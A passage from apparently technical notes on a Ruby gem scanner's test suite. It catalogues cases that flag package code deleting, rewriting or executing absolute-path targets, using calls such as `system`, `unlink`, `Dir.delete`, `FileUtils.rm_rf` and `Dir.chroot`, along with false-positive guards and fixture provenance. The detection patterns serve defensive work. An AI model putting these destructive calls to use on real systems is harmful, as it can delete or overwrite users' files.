the SAME percent-expansion path as the parened form) and R3b-C12c (relative-percent operand stays zero); the BLK-R3bF5 round adds R3b-C13a…C13d
(bare verb + `%x` with the four box-live NON-PAIRING delimiters `| ! % @` — the percent branch's span is
now the quoted payload, so ROOTED `^` and ABSOLUTE `"/` both see the rooted head, ONE expansion path)
and R3b-C13e (designator-agnostic siblings: `system %w|/usr/local/bin/x y|` argv0-form +
designator-less `system %|/usr/local/bin/x|` ⇒ two HIGH); the ROUND-8 roster sweep adds R3b-C14a/C14b
(boundary-complement tripwires: closure/interp tails `}x`/`]x`/`)x` and shell metas `>` `;` `>&` adjacent to a
rooted path stay 0-row BY DESIGN — item (9)/(11) — with a string-start rooted control that MUST row, so the
EXACT `[\s(\[{<]` class can never be silently shifted in either direction) and R3b-C15a…C15h (newly-covered
family: fixed-receiver `reopen` trio 2+3 rows, `sysopen` dot/`::`/IO forms 3, `IO.write/binwrite/copy_stream` 3,
metadata+mkfifo+2nd-arg-destination sweep 8, deletion lane `unlink/delete/rmdir` 3, in-tree operands of EVERY
new verb 0-row FP guard, read-only roster members 0-row silence) — then the ROUND-10 machine-table walk adds
R3b-C15a-bis (`$>.reopen` dot + `$>::reopen` scope + paren-less ⇒ three HIGH), extends R3b-C15e 8→9 (`File.lutime`)
and R3b-C15f 3→5 (`Dir.delete`/`Dir.unlink`), extends R3b-C15g's 0-row in-tree guard with every R10 verb, and adds
R3b-C15i (inherited-receiver `File.copy_stream`/`File.popen` + `Dir::delete` colon + no-double-price `FileUtils.rm_rf`
re-assert ⇒ four HIGH) and R3b-C15j (mkmf top-level bare `rm_rf`/`rm_f`/`xsystem`/`xpopen` + `Dir.chroot` ⇒ five HIGH) —
68 residue-gem tests total,
R3b-PIN/PIN2 still zero through every BLK and roster round; 28 channels/rubygems tests including the exit-2
metadata.gz-corruption case. Fixtures are
SOURCE dirs built at test time by the real `gem` 3.6.7 (same provenance doctrine as pypi's real
`python3 -m build`; the .gem bytes are never committed); the fixture corpus integrity claim is
behavioral — `sha256sum -c test/fixtures/residue/SHA256SUMS.local` passes 52/52 and every pre-BLK
stage pin (R3b-PIN…H) stayed green through the fixes.

